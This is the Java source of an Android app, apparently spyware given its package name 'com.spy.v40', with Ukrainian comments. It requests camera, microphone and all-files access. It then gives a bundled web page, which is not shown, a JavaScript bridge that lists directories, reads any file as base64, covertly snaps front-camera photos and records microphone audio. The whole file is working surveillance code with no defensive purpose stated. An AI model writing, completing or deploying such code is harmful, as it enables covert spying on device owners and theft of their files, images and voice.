package com.spy.v40;
import android.os.*; import android.webkit.*; import android.app.*; import android.content.*; import android.net.Uri; import android.provider.Settings; import java.io.File; import android.util.Base64; import android.hardware.Camera; import android.graphics.SurfaceTexture; import android.media.MediaRecorder; import android.Manifest; import android.content.pm.PackageManager;

public class MainActivity extends Activity {
    WebView w; MediaRecorder r;
    protected void onCreate(Bundle s) {
        super.onCreate(s);
        
        // ЗАПИТ ПРЯМИХ ДОЗВОЛІВ (Камера та Мікрофон)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED ||
                checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO}, 123);
            }
        }

        // ЗАПИТ ДОСТУПУ ДО ФАЙЛІВ (Android 11+)
        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
            startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName())));
        }

        w = new WebView(this);
        w.getSettings().setJavaScriptEnabled(true);
        w.getSettings().setAllowFileAccess(true);
        w.getSettings().setAllowUniversalAccessFromFileURLs(true);
        w.addJavascriptInterface(new Object() {
            @JavascriptInterface public String list(String path) {
                try { File f = new File(path); File[] fls = f.listFiles(); StringBuilder sb = new StringBuilder();
                if(fls == null) return "Locked";
                for (File file : fls) sb.append(file.isDirectory() ? "📁 " : "📄 ").append(file.getName()).append("\n");
                return sb.toString(); } catch (Exception e) { return "Error"; }
            }
            @JavascriptInterface public String getFileBase64(String path) {
                try { byte[] b = java.nio.file.Files.readAllBytes(new File(path).toPath()); return Base64.encodeToString(b, Base64.NO_WRAP); } catch (Exception e) { return "Error"; }
            }
            @JavascriptInterface public void takeSnap() {
                try { Camera c = Camera.open(1); c.setPreviewTexture(new SurfaceTexture(10)); c.startPreview();
                    c.takePicture(null, null, (data, cam) -> {
                        String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
                        runOnUiThread(() -> w.loadUrl("javascript:window.receiveSnap('" + b64 + "')"));
                        cam.release();
                    });
                } catch (Exception e) { }
            }
            @JavascriptInterface public void recordAudio(int ms) {
                try {
                    File out = new File(getExternalFilesDir(null), "rec.m4a");
                    r = new MediaRecorder(); r.setAudioSource(MediaRecorder.AudioSource.MIC);
                    r.setOutputFormat(MediaRecorder.Format.MPEG_4); r.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                    r.setOutputFile(out.getAbsolutePath()); r.prepare(); r.start();
                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                        try { r.stop(); r.release(); runOnUiThread(() -> w.loadUrl("javascript:dwF('" + out.getAbsolutePath() + "')")); } catch(Exception e){}
                    }, ms);
                } catch (Exception e) { }
            }
        }, "Android");
        w.loadUrl("file:///android_asset/index.html");
        setContentView(w);
    }
}